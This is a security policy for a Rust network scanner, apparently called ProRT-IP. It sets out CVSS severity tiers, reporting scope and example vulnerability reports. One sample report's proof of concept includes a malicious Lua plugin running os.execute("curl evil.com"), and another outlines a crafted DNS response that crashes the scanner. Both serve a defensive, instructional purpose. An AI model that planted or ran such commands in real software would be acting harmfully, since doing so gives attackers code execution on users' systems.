## Severity Classification

### CVSS v3.1 Scoring

We use the **Common Vulnerability Scoring System (CVSS) v3.1** to classify severity:

**Critical (CVSS 9.0-10.0)**
- **Impact**: Complete system compromise
- **Examples**: Remote code execution, privilege escalation to root, full scan data exfiltration
- **Fix Timeline**: 30 days
- **Response**: Immediate triage, emergency patch

**High (CVSS 7.0-8.9)**
- **Impact**: Significant security degradation
- **Examples**: Denial of service (crash/hang), memory corruption, authentication bypass
- **Fix Timeline**: 60 days
- **Response**: High priority, regular updates

**Medium (CVSS 4.0-6.9)**
- **Impact**: Limited security impact
- **Examples**: Partial information disclosure, resource exhaustion, logic errors affecting security
- **Fix Timeline**: 90 days
- **Response**: Normal priority, scheduled fix

**Low (CVSS 0.1-3.9)**
- **Impact**: Minimal security impact
- **Examples**: Minor information leaks, non-exploitable crashes, documentation issues
- **Fix Timeline**: Best effort (no SLA)
- **Response**: Tracked for future release

### Severity Examples

**Critical: Remote Code Execution**
```
CVSS Score: 10.0
Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H

Vulnerability: Unsafe deserialization in plugin loading
Impact: Attacker can execute arbitrary code by crafting malicious plugin
Attack Scenario: Remote attacker sends malicious plugin file → ProRT-IP loads
                 plugin → attacker gains code execution with ProRT-IP privileges
```

**High: Denial of Service**
```
CVSS Score: 7.5
Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H

Vulnerability: Integer overflow in packet parsing
Impact: Attacker can crash ProRT-IP scanner remotely
Attack Scenario: Malicious target crafts oversized response → ProRT-IP attempts
                 to allocate excessive memory → crash or hang
```

**Medium: Information Disclosure**
```
CVSS Score: 5.3
Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N

Vulnerability: Verbose error messages leak scan targets
Impact: Attacker can infer which networks are being scanned
Attack Scenario: Network administrator monitors error logs → discovers internal
                 network ranges being scanned by security team
```

**<boltbreak>Low: Documentation Error**
```
CVSS Score: 2.0
Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N

Vulnerability: Misleading documentation about privilege requirements
Impact: Users may run scanner with excessive privileges
Attack Scenario: User follows documentation → runs as root unnecessarily →
                 increased attack surface if scanner is compromised
```

## Scope

### In Scope

**Vulnerabilities we want to know about:**

**Memory Safety Issues**
- Buffer overflows (should be impossible in safe Rust, but check unsafe blocks)
- Use-after-free (should be impossible, but check FFI boundaries)
- Integer overflows leading to security issues
- Data races causing security vulnerabilities

**Privilege Escalation**
- Failures in privilege drop mechanism
- Capability leaks after privilege drop
- Unauthorized access to privileged operations

**Network Security**
- Malformed packet handling causing crashes or RCE
- Protocol parsing vulnerabilities (HTTP, TLS, DNS, etc.)
- Denial of service via network input

**Input Validation**
- Command injection via CLI arguments
- SQL injection via database operations
- Path traversal in file operations
- TOCTOU (Time-of-Check-Time-of-Use) races

**Plugin Security**
- Lua sandbox escapes
- Capability model bypasses
- Resource exhaustion via plugins
- Plugin signature verification bypasses (future feature)

**Cryptographic Issues**
- Weak or broken cryptographic algorithms
- Insecure TLS configuration
- Certificate validation bypasses
- Cryptographic key leaks

**Authentication/Authorization**
- Bypassing access controls
- Session management issues (future feature)
- Authentication bypasses (future feature)

### Out of Scope

**Issues we typically do NOT consider vulnerabilities:**

**Low-Impact Issues**
- Denial of service requiring local access with existing privileges
- Information leaks requiring physical access
- Issues in non-security-critical code paths
- Cosmetic issues in TUI or output formatting

**Intended Behavior**
- ProRT-IP requires elevated privileges for raw socket access (documented feature)
- Network scanning can be detected by IDS/IPS (fundamental limitation)
- Scan results stored in plaintext (user responsibility, encryption future feature)
- TCP connect scans are slower than SYN scans (documented trade-off)

**Third-Party Issues**
- Vulnerabilities in upstream dependencies (report to maintainers, we track via `cargo audit`)
- Operating system vulnerabilities
- Kernel exploits
- Hardware vulnerabilities (Spectre, Meltdown, etc.)

**Social Engineering**
- Phishing attacks against ProRT-IP users
- Attacks requiring user to execute malicious code
- Insider threats

**Invalid Reports**
- Duplicate reports (already known/reported)
- Issues in unsupported versions (< 0.5.0 unless security backport warranted)
- Reports without sufficient detail to reproduce
- Theoretical vulnerabilities without proof of concept

### Edge Cases

**Gray Area Issues** (case-by-case evaluation):

**Resource Exhaustion**
- **In Scope** if: Remotely triggerable with minimal attacker resources, causes total DoS
- **Out of Scope** if: Requires sustained high-volume traffic, easily mitigated with rate limiting

**Information Disclosure**
- **In Scope** if: Leaks sensitive data (credentials, private keys, full scan results)
- **Out of Scope** if: Leaks non-sensitive metadata (ProRT-IP version, OS type)

**Logic Errors**
- **In Scope** if: Affects security-critical functionality (privilege drop, input validation)
- **Out of Scope** if: Affects non-security features (scan performance, output formatting)

### Published Advisories

**Current Status**: No published security advisories as of November 15, 2025.

ProRT-IP has had **zero security vulnerabilities** reported and confirmed since initial release in 2024. This is a testament to:
- Memory-safe Rust implementation (buffer overflows, use-after-free impossible)
- Comprehensive fuzz testing (230M+ executions, 0 crashes)
- Security-focused development practices (threat modeling, secure defaults)
- Regular dependency audits (`cargo audit`, 0 critical vulnerabilities)

### Ignored Advisories

**RUSTSEC-2024-0436: `paste` crate unmaintained**
- **Status**: Ignored (compile-time only, zero security impact)
- **Reason**: `paste` is a proc-macro crate used only during compilation, not included in ProRT-IP binary
- **Risk Assessment**: No runtime security risk (proc-macros execute during build, not in deployed software)
- **Monitoring**: Tracking `pastey` migration in `ratatui` crate (indirect dependency)
- **Mitigation**: None required (compile-time dependency, no user-facing code)

**Why We Document Ignored Advisories:**
- **Transparency**: Users should understand ALL dependency advisories
- **Risk Assessment**: Explain why advisory doesn't apply to ProRT-IP
- **Monitoring**: Show we're actively tracking upstream fixes
- **Accountability**: Demonstrate security team reviewed and made informed decision

## Examples

### Example 1: Valid Critical Report

```markdown
Subject: [SECURITY] Remote Code Execution in Plugin Loading

Description:
ProRT-IP version 0.4.x allows arbitrary code execution via malicious plugin files.

Impact:
Attacker with ability to provide plugin files to ProRT-IP can execute arbitrary
code with ProRT-IP's privileges.

Affected Versions:
All versions < 0.5.0

Proof of Concept:
1. Create malicious plugin: malicious.lua with os.execute("curl evil.com")
2. Run: prtip --plugin malicious.lua -sS -p 80 target.com
3. Observe: ProRT-IP executes attacker-controlled command

Suggested Fix:
Implement Lua sandboxing to remove access to dangerous functions like os.execute,
io.popen, dofile, loadfile.

Discovery:
Found during security audit of plugin system implementation.
```

**Why This Is Valid**:
- Clear vulnerability description
- Demonstrates security impact (RCE)
- Provides reproduction steps
- Includes suggested mitigation
- Affects supported versions

**Expected Response**:
- Acknowledge within 48 hours
- Confirm severity: Critical (CVSS 9.0+)
- Fix within 30 days
- Coordinate public disclosure

---

### Example 2: Valid High Report

```markdown
Subject: Denial of Service via Malformed DNS Response

Description:
ProRT-IP crashes when receiving malformed DNS response packets with oversized
header fields.

Impact:
Malicious target can crash ProRT-IP scanner remotely by sending crafted DNS
response, causing denial of service.

Affected Versions:
Tested on 0.5.0, likely affects earlier versions

Proof of Concept:
1. Set up DNS server responding with header length field set to 0xFFFFFFFF
2. Run: prtip -sU -p 53 malicious-dns-server.com
3. Observe: ProRT-IP crashes with panic in DNS parser

Suggested Fix:
Add bounds checking in DNS parser before allocating memory based on header length.

Discovery:
Fuzzing DNS parser with AFL++
```

**Why This Is Valid**:
- Remote denial of service
- Affects network security functionality
- Detailed reproduction steps
- Provides suggested fix

**Expected Response**:
- Acknowledge within 48 hours
- Confirm severity: High (CVSS 7.5)
- Fix within 60 days

---

### Example 3: Invalid Low-Impact Report

```markdown
Subject: Information Disclosure in Version String

Description:
ProRT-IP includes full version string in scan output, allowing attackers to
fingerprint ProRT-IP version.

Impact:
Attacker can determine which ProRT-IP version is scanning their network.

Proof of Concept:
Run: prtip --version
Observe: Full version displayed including "v0.5.0"

Suggested Fix:
Remove version string from output.
```

**Why This Is Invalid**:
- **Out of Scope**: Version fingerprinting is expected behavior, not a vulnerability
- **No Security Impact**: Knowing scanner version doesn't enable attacks
- **Intentional Feature**: Version string helps with bug reports and debugging

**Expected Response**:
- Acknowledge receipt
- Explain why not considered vulnerability
- Suggest alternative solutions (if applicable)

---

### Example 4: Invalid Duplicate Report

```markdown
Subject: SQL Injection in Database Storage

Description:
ProRT-IP is vulnerable to SQL injection when storing scan results.

[... rest of report ...]
```

**Why This Is Invalid**:
- **Duplicate**: Already reported and fixed in v0.4.0
- **Outdated**: Affects only unsupported versions (< 0.5.0)

**Expected Response**:
- Acknowledge receipt
- Note that issue was previously reported and fixed
- Provide reference to security advisory or fix commit
